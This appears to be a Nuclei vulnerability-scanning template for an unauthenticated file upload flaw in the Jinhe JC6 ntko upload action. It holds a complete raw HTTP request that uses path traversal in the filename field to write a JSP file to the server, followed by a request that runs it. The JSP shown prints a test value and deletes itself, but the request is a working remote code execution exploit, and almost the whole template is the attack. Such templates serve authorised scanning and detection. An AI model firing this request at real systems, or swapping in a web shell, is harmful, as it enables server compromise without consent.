id: jinhe-jc6-ntko-upload-fileupload

info:
  name: jinhe-jc6-ntko-upload-fileupload
  author: msk
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Accept-Encoding: gzip, deflate
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----{{boundary}}

        ------{{boundary}}
        Content-Disposition: form-data; name="filename"
        
        ../../../../upload/{{filename}}.jsp
        ------{{boundary}}
        Content-Disposition: form-data; name="upLoadFile"; filename="{{filename}}.jpg"
        Content-Type: image/jpeg
        
        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------{{boundary}}
        Content-Disposition: form-data; name="Submit"
        
        upload
        ------{{boundary}}--


      - |
        GET /upload/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

    extractors:
      - type: dsl
        name: only_for_sleep
        dsl:
          - wait_for(3)

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"12321")